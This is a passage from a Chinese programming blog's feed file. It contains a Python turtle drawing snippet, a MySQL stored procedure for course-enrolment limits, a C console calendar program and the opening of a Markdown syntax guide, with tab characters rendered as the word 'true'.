class="line">t.fd(40)</span><br><span class="line">t.seth(-180)</span><br><span class="line">t.color(&quot;black&quot;)</span><br><span class="line">t.pensize(15)</span><br><span class="line">t.fd(20)</span><br><span class="line">#尾巴</span><br><span class="line">t.pensize(4)</span><br><span class="line">t.color((255,155,192))</span><br><span class="line">t.pu()</span><br><span class="line">t.seth(90)</span><br><span class="line">t.fd(70)</span><br><span class="line">t.seth(0)</span><br><span class="line">t.fd(95)</span><br><span class="line">t.pd()</span><br><span class="line">t.seth(0)</span><br><span class="line">t.circle(70,20)</span><br><span class="line">t.circle(10,330)</span><br><span class="line">t.circle(70,30)</span><br><span class="line">input()</span><br></pre></td></tr></table></figure><h2 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h2><div align="center">!["小猪佩奇"](/article_img/xiaozhupeiqi.gif)</div>]]></content>
      
      <categories>
          
          <category> 程序设计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>mysql存储过程使用案例</title>
      <link href="/2018/06-03-mysql%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E4%BD%BF%E7%94%A8%E6%A1%88%E4%BE%8B.html"/>
      <url>/2018/06-03-mysql%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E4%BD%BF%E7%94%A8%E6%A1%88%E4%BE%8B.html</url>
      <content type="html"><![CDATA[<h2 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h2><p>    检查该学生选课门数是否超过3门，若超过，不插入记录；<br>    检查该课程选课人数是否已满（在course表里添加一个属性列，记录课程人数限制）；<br>    选课人数已满：不插入记录；<br>    选课人数未满且未插入过：完成数据插入操作；<br>    选课人数未满，已插入过：不插入记录<br>    最后返回执行结果信息，例如：<br>    超过3门，返回-1；<br>    选课人数已满。返回0；<br>    选课人数未满且未插入过：返回1；<br>    选课人数未满已插入过：返回2</p><h2 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h2><h3 id="在course表里添加一个属性列，记录课程人数限制"><a href="#在course表里添加一个属性列，记录课程人数限制" class="headerlink" title="在course表里添加一个属性列，记录课程人数限制"></a>在course表里添加一个属性列，记录课程人数限制</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">alter table course</span><br><span class="line">add column n_limit int;</span><br><span class="line">update course</span><br><span class="line"><span class="built_in">set</span> n_limit=3;</span><br></pre></td></tr></table></figure><h3 id="创建存储存储过程take-course"><a href="#创建存储存储过程take-course" class="headerlink" title="创建存储存储过程take_course"></a>创建存储存储过程take_course</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$mysql</span>中变量不用事前申明，在用的时候直接用“@变量名”使用就可以了</span><br><span class="line">DELIMITER // 的作用：改变sql的执行，默认是到分号;执行，改为到//执行，新版的mysql中创建存储过程容易出现提前执行的错误.</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">DELIMITER //</span><br><span class="line">DROP procedure IF EXISTS take_course;</span><br><span class="line">create procedure take_course(<span class="keyword">in</span> s_no varchar(100),<span class="keyword">in</span> c_no varchar(100),out result int)</span><br><span class="line">begin</span><br><span class="line"><span class="built_in">set</span> @result=1, @n_count=0,@c_count=0;</span><br><span class="line">select count(*) into @n_count from sc</span><br><span class="line"><span class="built_in">where</span> s_no=sno;</span><br><span class="line">select count(*) into @c_count from sc</span><br><span class="line"><span class="built_in">where</span> c_no=cno;</span><br><span class="line"><span class="keyword">if</span> @n_count&gt;=3 <span class="keyword">then</span></span><br><span class="line">truetrue<span class="built_in">set</span> @result=-1;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> @c_count&lt;3 and not exists(select * from sc <span class="built_in">where</span> s_no=sno and c_no=cno)</span><br><span class="line">truetruetrue<span class="keyword">then</span> insert into sc(sno,cno)values(s_no,c_no);</span><br><span class="line">truetruetrue<span class="built_in">set</span> @result=1;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">truetruetrue<span class="keyword">if</span> @c_count&lt;3 and exists(select * from sc <span class="built_in">where</span> s_no=sno and c_no=cno)</span><br><span class="line">truetruetrue<span class="keyword">then</span> <span class="built_in">set</span> @result=2;</span><br><span class="line">truetruetrue<span class="keyword">else</span>  <span class="built_in">set</span> @result=0;</span><br><span class="line">truetruetrueend <span class="keyword">if</span>;</span><br><span class="line">truetruetrueend <span class="keyword">if</span>;</span><br><span class="line">end <span class="keyword">if</span>;</span><br><span class="line"><span class="built_in">set</span> result=@result;</span><br><span class="line">end//</span><br></pre></td></tr></table></figure><h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如下列方式：</span><br><span class="line">call take_course(&apos;9521101&apos;,&apos;C04&apos;,@result);</span><br><span class="line">select @result;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> 程序设计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>c语言简单日历小程序</title>
      <link href="/2018/05-28-c%E8%AF%AD%E8%A8%80%E7%AE%80%E5%8D%95%E6%97%A5%E5%8E%86%E5%B0%8F%E7%A8%8B%E5%BA%8F.html"/>
      <url>/2018/05-28-c%E8%AF%AD%E8%A8%80%E7%AE%80%E5%8D%95%E6%97%A5%E5%8E%86%E5%B0%8F%E7%A8%8B%E5%BA%8F.html</url>
      <content type="html"><![CDATA[<h2 id="代码部分"><a href="#代码部分" class="headerlink" title="代码部分"></a>代码部分</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;  </span><br><span class="line">#include &lt;conio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;  </span><br><span class="line">#include &lt;time.h&gt;  </span><br><span class="line">void menu();/*菜单*/</span><br><span class="line">void runnian();    /*判断是否是闰年*/</span><br><span class="line"></span><br><span class="line">void showCalendar(int y, int m);        /*显示日历*/</span><br><span class="line">int CalculatePerMonth(int y, int m);     /*计算每月都有多少天*/</span><br><span class="line"></span><br><span class="line">void input_birth();   /*统计出生的时间*/</span><br><span class="line"></span><br><span class="line">void now_day();/*统计日期是第多少天*/</span><br><span class="line"></span><br><span class="line">char *CalculateDay(int y, int m, int d);     /*用于计算输入的年月日对应的是周几*/</span><br><span class="line"></span><br><span class="line">int year, month, day;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">truemenu();</span><br><span class="line">trueprintf(&quot;\n&quot;);</span><br><span class="line">truereturn 0;</span><br><span class="line">&#125;</span><br><span class="line">void menu()</span><br><span class="line">&#123;</span><br><span class="line">trueint a;</span><br><span class="line">trueint type;</span><br><span class="line">trueint run = 1;</span><br><span class="line">truedo &#123;</span><br><span class="line">truetruesystem(&quot;cls&quot;);</span><br><span class="line">truetrueprintf(&quot;\n***************************************\n&quot;</span><br><span class="line">truetruetrue&quot;*    1.显示输入日期的月历             *\n&quot;</span><br><span class="line">truetruetrue&quot;*    2.判断某一年是否是闰年           *\n&quot;</span><br><span class="line">truetruetrue&quot;*    3.统计出生的时间                 *\n&quot;</span><br><span class="line">truetruetrue&quot;*    4.统计日期是第多少天             *\n&quot;</span><br><span class="line">truetruetrue&quot;*    0.退出。                         *\n&quot;</span><br><span class="line">truetruetrue&quot;***************************************\n&quot;);</span><br><span class="line">truetrueprintf(&quot;请按菜单进行选择(0-4)：&quot;);</span><br><span class="line">truetruescanf(&quot;%d&quot;, &amp;type);</span><br><span class="line">truetrueswitch (type) &#123;</span><br><span class="line">truetruecase 0:</span><br><span class="line">truetruetruewhile (1)</span><br><span class="line">truetruetrue&#123;</span><br><span class="line">truetruetruetruegetchar();</span><br><span class="line">truetruetruetrueprintf(&quot;你确定退出吗？(输入1退出)&quot;);</span><br><span class="line">truetruetruetruescanf(&quot;%d&quot;, &amp;a);</span><br><span class="line">truetruetruetrueif (a == 1)</span><br><span class="line">truetruetruetruetruereturn;</span><br><span class="line">truetruetruetrueelse</span><br><span class="line">truetruetruetrue&#123;</span><br><span class="line">truetruetruetruetrueprintf(&quot;退出取消，按任意键返回菜单...&quot;);</span><br><span class="line">truetruetruetruetruegetch();</span><br><span class="line">truetruetruetruetruesystem(&quot;cls&quot;);</span><br><span class="line">truetruetruetruetruebreak;</span><br><span class="line">truetruetruetrue&#125;</span><br><span class="line">truetruetrue&#125;</span><br><span class="line">truetruetruebreak;</span><br><span class="line"></span><br><span class="line">truetruecase 1:</span><br><span class="line">truetruetruesystem(&quot;cls&quot;);</span><br><span class="line">truetruetrueprintf(&quot;请输入年份及月份:\n&quot;);</span><br><span class="line">truetruetruescanf(&quot;%d%d&quot;, &amp;year, &amp;month);</span><br><span class="line">truetruetrueshowCalendar(year, month); break;</span><br><span class="line">truetruecase 2:runnian(); break;</span><br><span class="line">truetruecase 3:input_birth(); break;</span><br><span class="line">truetruecase 4:now_day(); break;</span><br><span class="line">truetruedefault: system(&quot;cls&quot;); break;</span><br><span class="line">truetrue&#125;</span><br><span class="line">true&#125; while (run);</span><br><span class="line">&#125;</span><br><span class="line">char *CalculateDay(int y, int m, int d)</span><br><span class="line">&#123;</span><br><span class="line">truestatic int r[13] = &#123; 0,0,3,3,6,1,4,6,2,5,0,3,5 &#125;;</span><br><span class="line">trueint c, w;</span><br><span class="line">truechar *week;</span><br><span class="line">truey %= 400;</span><br><span class="line">trueif ((y == 0 || y % 4 == 0 &amp;&amp; y % 100 != 0) &amp;&amp; m &lt; 3)</span><br><span class="line">truetruec = 5;</span><br><span class="line">trueelse</span><br><span class="line">truetruec = 6;</span><br><span class="line">truew = (y + y / 4 - y / 100 + r[m] + d + c) % 7;</span><br><span class="line">trueswitch (w)</span><br><span class="line">true&#123;</span><br><span class="line">truecase 0:</span><br><span class="line">truetrueweek = &quot;星期天&quot;;</span><br><span class="line">truetruebreak;</span><br><span class="line">truecase 1:</span><br><span class="line">truetrueweek = &quot;星期一&quot;;</span><br><span class="line">truetruebreak;</span><br><span class="line">truecase 2:</span><br><span class="line">truetrueweek = &quot;星期二&quot;;</span><br><span class="line">truetruebreak;</span><br><span class="line">truecase 3:</span><br><span class="line">truetrueweek = &quot;星期三&quot;;</span><br><span class="line">truetruebreak;</span><br><span class="line">truecase 4:</span><br><span class="line">truetrueweek = &quot;星期四&quot;;</span><br><span class="line">truetruebreak;</span><br><span class="line">truecase 5:</span><br><span class="line">truetrueweek = &quot;星期五&quot;;</span><br><span class="line">truetruebreak;</span><br><span class="line">truecase 6:</span><br><span class="line">truetrueweek = &quot;星期六&quot;;</span><br><span class="line">truetruebreak;</span><br><span class="line">true&#125;</span><br><span class="line"></span><br><span class="line">truereturn week;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int CalculatePerMonth(int y, int m)  //计算每月有多天  </span><br><span class="line">&#123;</span><br><span class="line">trueif ((m == 1) || (m == 3) || (m == 5) || (m == 7) || (m == 8) || (m == 10) || (m == 12))</span><br><span class="line">truetruereturn 31;</span><br><span class="line">trueelse if (m != 2)</span><br><span class="line">truetruereturn 30;</span><br><span class="line">trueelse if ((y % 4 == 0) &amp;&amp; (y % 100 != 0) || (y % 400 == 0))</span><br><span class="line">truetruereturn 29;</span><br><span class="line">trueelse</span><br><span class="line">truetruereturn 28;</span><br><span class="line">&#125;</span><br><span class="line">void input_birth()</span><br><span class="line">&#123;</span><br><span class="line">truelong sum = 0;</span><br><span class="line">trueint year2, month2, day2;</span><br><span class="line">truestruct tm  t1 = &#123; 0 &#125;, t2 = &#123; 0 &#125;;</span><br><span class="line">truetime_t timep,a1,a2;   /*系统时间函数，获取当今年月日*/</span><br><span class="line">truestruct tm *p;</span><br><span class="line">truetime(&amp;timep);</span><br><span class="line">truep = gmtime(&amp;timep);</span><br><span class="line">truemonth2 = 1 + p-&gt;tm_mon;</span><br><span class="line">trueyear2 = 1900 + p-&gt;tm_year;</span><br><span class="line">trueday2 = p-&gt;tm_mday;</span><br><span class="line">trueprintf(&quot;请输入生日（年 月 日）:\n&quot;);</span><br><span class="line">truescanf(&quot;%d%d%d&quot;, &amp;year, &amp;month, &amp;day);</span><br><span class="line">truet1.tm_year = year - 1900;</span><br><span class="line">truet1.tm_mon = month - 1;</span><br><span class="line">truet1.tm_mday = day;</span><br><span class="line">truet2.tm_year = year2 - 1900;  /*当前时间*/</span><br><span class="line">truet2.tm_mon = month2 - 1;</span><br><span class="line">truet2.tm_mday = day2;</span><br><span class="line">truea1 = mktime(&amp;t1); /*转为秒的函数*/</span><br><span class="line">truea2 = mktime(&amp;t2);</span><br><span class="line">truesum = (a2 - a1) / (24 * 3600);</span><br><span class="line">trueprintf(&quot;已存活%ld天,%ld个小时&quot;, sum,sum*24 );</span><br><span class="line">truegetch();</span><br><span class="line">&#125;</span><br><span class="line">void now_day()</span><br><span class="line">&#123;</span><br><span class="line">trueint year2, month2, day2;</span><br><span class="line">truelong sum;</span><br><span class="line">truechar *week;</span><br><span class="line">truestruct tm t1 = &#123; 0 &#125;, t2 = &#123; 0 &#125;;</span><br><span class="line">truetime_t  a1, a2;</span><br><span class="line">trueprintf(&quot;请输入日期（年 月 日）:\n&quot;);</span><br><span class="line">truescanf(&quot;%d%d%d&quot;, &amp;year2, &amp;month2, &amp;day2);</span><br><span class="line">truet2.tm_year = year2 - 1900;</span><br><span class="line">truet2.tm_mon = month2 - 1;</span><br><span class="line">truet2.tm_mday = day2;</span><br><span class="line">truet1 = t2;</span><br><span class="line">truet1.tm_mon = 1 - 1;</span><br><span class="line">truet2.tm_mday = 1;</span><br><span class="line">truea1 = mktime(&amp;t1);</span><br><span class="line">truea2 = mktime(&amp;t2);</span><br><span class="line">trueweek = CalculateDay(year2, month2, day2);</span><br><span class="line">truesum = abs((a2 - a1) / (24 * 3600)) + 1;/*天数，+1*/</span><br><span class="line">trueprintf(&quot;已存活%ld天,%s&quot;,sum , week);</span><br><span class="line">truegetch();</span><br><span class="line">&#125;</span><br><span class="line">void showCalendar(int y, int m)  //显示日历</span><br><span class="line">&#123;</span><br><span class="line">truechar *week;          /*每月的1号是周几*/</span><br><span class="line">trueint perMonth;   /*每月共有多少天*/</span><br><span class="line">trueint w;</span><br><span class="line">trueprintf(&quot;当前月的月历如下:\n&quot;);</span><br><span class="line">trueperMonth = CalculatePerMonth(y, m);</span><br><span class="line">trueweek = CalculateDay(y, m, 1);</span><br><span class="line"></span><br><span class="line">trueif (week == &quot;星期天&quot;)</span><br><span class="line">truetruew = 0;</span><br><span class="line">trueelse if (week == &quot;星期一&quot;)</span><br><span class="line">truetruew = 1;</span><br><span class="line">trueelse if (week == &quot;星期二&quot;)</span><br><span class="line">truetruew = 2;</span><br><span class="line">trueelse if (week == &quot;星期三&quot;)</span><br><span class="line">truetruew = 3;</span><br><span class="line">trueelse if (week == &quot;星期四&quot;)</span><br><span class="line">truetruew = 4;</span><br><span class="line">trueelse if (week == &quot;星期五&quot;)</span><br><span class="line">truetruew = 5;</span><br><span class="line">trueelse if (week = &quot;星期六&quot;)</span><br><span class="line">truetruew = 6;</span><br><span class="line"></span><br><span class="line">trueprintf(&quot;\n**************************************&quot;);</span><br><span class="line">trueprintf(&quot;\n日    一    二    三    四    五    六&quot;);</span><br><span class="line">trueprintf(&quot;\n**************************************\n&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">trueint i = 0;</span><br><span class="line">trueint count = w;</span><br><span class="line"></span><br><span class="line">truewhile (w&gt;0)</span><br><span class="line">true&#123;</span><br><span class="line">truetrueprintf(&quot;      &quot;);</span><br><span class="line">truetruew--;</span><br><span class="line">true&#125;</span><br><span class="line"></span><br><span class="line">truefor (i = 1; i &lt;= perMonth; i++)</span><br><span class="line">true&#123;</span><br><span class="line">truetrueprintf(&quot;%-6d&quot;, i);</span><br><span class="line">truetruecount++;</span><br><span class="line">truetrueif (count == 7)</span><br><span class="line">truetrue&#123;</span><br><span class="line">truetruetrueprintf(&quot;\n&quot;);</span><br><span class="line">truetruetruecount = 0;</span><br><span class="line">truetrue&#125;</span><br><span class="line">true&#125;</span><br><span class="line">trueprintf(&quot;\n**************************************\n&quot;);</span><br><span class="line">truegetch();</span><br><span class="line">&#125;</span><br><span class="line">void runnian()</span><br><span class="line">&#123;</span><br><span class="line">truesystem(&quot;cls&quot;);</span><br><span class="line">trueprintf(&quot;请输入年份：&quot;);</span><br><span class="line">truescanf(&quot;%d&quot;, &amp;year);</span><br><span class="line">trueif ((year % 4 == 0) &amp;&amp; (year % 100 != 0) || (year % 400 == 0))</span><br><span class="line">truetrueprintf(&quot;此年是闰年\n&quot;);</span><br><span class="line">trueelse</span><br><span class="line">truetrueprintf(&quot;此年不是闰年\n&quot;);</span><br><span class="line">truegetch();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> 程序设计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c语言 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>markdown用户手册</title>
      <link href="/2018/05-25-markdown.html"/>
      <url>/2018/05-25-markdown.html</url>
      <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><h2 id="宗旨"><a href="#宗旨" class="headerlink" title="宗旨"></a>宗旨</h2><p>Markdown 的目标是实现「易读易写」。</p><p>可读性，无论如何，都是最重要的。一份使用 Markdown 格式撰写的文件应该可以直接以纯文本发布，并且看起来不会像是由许多标签或是格式指令所构成。Markdown 语法受到一些既有 text-to-HTML 格式的影响，包括 Setext、atx、Textile、reStructuredText、Grutatext 和 EtText，而最大灵感来源其实是纯文本电子邮件的格式。</p><p>总之， Markdown 的语法全由一些符号所组成，这些符号经过精挑细选，其作用一目了然。比如：在文字两旁加上星号，看起来就像<em>强调</em>。Markdown 的列表看起来，嗯，就是列表。Markdown 的区块引用看起来就真的像是引用一段文字，就像你曾在电子邮件中见过的那样。</p><h2 id="兼容-HTML"><a href="#兼容-HTML" class="headerlink" title="兼容 HTML"></a>兼容 HTML</h2><p>Markdown 语法的目标是：成为一种适用于网络的书写语言。</p><p>Markdown 不是想要取代 HTML，甚至也没有要和它相近，它的语法种类很少，只对应 HTML 标记的一小部分。Markdown 的构想不是要使得 HTML 文档更容易书写。在我看来， HTML 已经很容易写了。Markdown 的理念是，能让文档更容易读、写和随意改。HTML 是一种发布的格式，Markdown 是一种书写的格式。就这样，Markdown 的格式语法只涵盖纯文本可以涵盖的范围。</p><p>不在 Markdown 涵盖范围之内的标签，都可以直接在文档里面用 HTML 撰写。不需要额外标注这是 HTML 或是 Markdown；只要直接加标签就可以了。</p><p>要制约的只有一些 HTML 区块元素――比如<code>&lt;span&gt;</code>、<code>&lt;cite&gt;</code>、<code>&lt;del&gt;</code> 等标签，必须在前后加上空行与其它内容区隔开，还要求它们的开始标签与结尾标签不能用制表符或空格来缩进。Markdown 的生成器有足够智能，不会在 HTML 区块标签外加上不必要的 </p><p> 标签。</p><p>例子如下，在 Markdown 文件里加上一段 HTML 表格：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;table&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td&gt;Foo&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure><p>请注意，在 HTML 区块标签间的 Markdown 格式语法将不会被处理。比如，你在 HTML 区块内使用 Markdown 样式的<code>*强调*</code>会没有效果。</p><p>HTML 的区段（行内）标签如 <code>&lt;span&gt;</code>、<code>&lt;cite&gt;</code>、<code>&lt;del&gt;</code> 可以在 Markdown 的段落、列表或是标题里随意使用。依照个人习惯，甚至可以不用 Markdown 格式，而直接采用 HTML 标签来格式化。举例说明：如果比较喜欢 HTML 的<code>&lt;a&gt;</code> 或 <code>&lt;img&gt;</code> 标签，可以直接使用这些标签，而不用 Markdown 提供的链接或是图像标签语法。</p><p>和处在 HTML 区块标签间不同，Markdown 语法在 HTML 区段标签间是有效的。</p><p>特殊字符自动转换<br>在 HTML 文件中，有两个字符需要特殊处理： &lt; 和 &amp; 。 &lt; 符号用于起始标签，&amp; 符号则用于标记 HTML 实体，如果你只是想要显示这些字符的原型，你必须要使用实体的形式，像是 &lt; 和 &amp;。<br>&amp; 字符尤其让网络文档编写者受折磨，如果你要打「「<code>AT&amp;T</code>」 ，你必须要写成「<code>AT&amp;amp;T</code>」。而网址中的 &amp; 字符也要转换。比如你要链接到：</p><pre><code>http://images.google.com/images?num=30&amp;q=larry+bird</code></pre><p>你必须要把网址转换写为：</p><pre><code>http://images.google.com/images?num=30&amp;amp;q=larry+bird</code></pre><p>才能放到链接标签的 <code>href</code> 属性里。不用说也知道这很容易忽略，这也可能是 HTML 标准检验所检查到的错误中，数量最多的。</p><p>Markdown 让你可以自然地书写字符，需要转换的由它来处理好了。如果你使用的 <code>&amp;</code> 字符是 HTML 字符实体的一部分，它会保留原状，否则它会被转换成 <code>&amp;amp</code>;。</p><p>所以你如果要在文档中插入一个版权符号 <code>©</code>，你可以这样写：</p><pre><code>&amp;copy;</code></pre><p>Markdown 会保留它不动。而若你写：</p><pre><code>AT&amp;T</code></pre><p>Markdown 就会将它转为：</p><pre><code>AT&amp;amp;T</code></pre><p>类似的状况也会发生在 <code>&lt;</code> 符号上，因为 Markdown 允许 <a href="#html">兼容 HTML</a> ，如果你是把 <code>&lt;</code> 符号作为 HTML 标签的定界符使用，那 Markdown 也不会对它做任何转换，但是如果你写：</p><pre><code>4 &lt; 5</code></pre><p>Markdown 将会把它转换为：</p><pre><code>4 &amp;lt; 5</code></pre><p>不过需要注意的是，code 范围内，不论是行内还是区块， <code>&lt;</code> 和 <code>&amp;</code> 两个符号都<em>一定</em>会被转换成 HTML 实体，这项特性让你可以很容易地用 Markdown 写 HTML code （和 HTML 相对而言， HTML 语法中，你要把所有的 <code>&lt;</code> 和 <code>&amp;</code> 都转换为 HTML 实体，才能在 HTML 文件里面写出 HTML code。）</p><hr><h2 id="block">区块元素</h2><h3 id="p">段落和换行</h3><p>一个 Markdown 段落是由一个或多个连续的文本行组成，它的前后要有一个以上的空行（空行的定义是显示上看起来像是空的，便会被视为空行。比方说，若某一行只包含空格和制表符，则该行也会被视为空行）。普通段落不该用空格或制表符来缩进。</p><p>「由一个或多个连续的文本行组成」这句话其实暗示了 Markdown 允许段落内的强迫换行（插入换行符），这个特性和其他大部分的 text-to-HTML 格式不一样（包括 Movable Type 的「Convert Line Breaks」选项），其它的格式会把每个换行符都转成 <code>&lt;br /&gt;</code> 标签。</p><p>如果你<em>确实</em>想要依赖 Markdown 来插入 <code>&lt;br /&gt;</code> 标签的话，在插入处先按入两个以上的空格然后回车。</p><p>的确，需要多费点事（多加空格）来产生 <code>&lt;br /&gt;</code> ，但是简单地「每个换行都转换为 <code>&lt;br /&gt;</code>」的方法在 Markdown 中并不适合， Markdown 中 email 式的 <a href="#blockquote">区块引用</a> 和多段落的 <a href="#list">列表</a> 在使用换行来排版的时候，不但更好用，还更方便阅读。</p><h3 id="header">标题</h3><p>Markdown 支持两种标题的语法，类 <a href="http://docutils.sourceforge.net/mirror/setext.html" target="_blank" rel="noopener">Setext</a> 和类 <a href="http://www.aaronsw.com/2002/atx/" target="_blank" rel="noopener">atx</a> 形式。</p><p>类 Setext 形式是用底线的形式，利用 <code>=</code> （最高阶标题）和 <code>-</code> （第二阶标题），例如：</p><pre><code>This is an H1=============This is an H2-------------</code></pre><p>任何数量的 <code>=</code> 和 <code>-</code> 都可以有效果。</p><p>类 Atx 形式则是在行首插入 1 到 6 个 <code>#</code> ，对应到标题 1 到 6 阶，例如：</p><pre><code># 这是 H1## 这是 H2###### 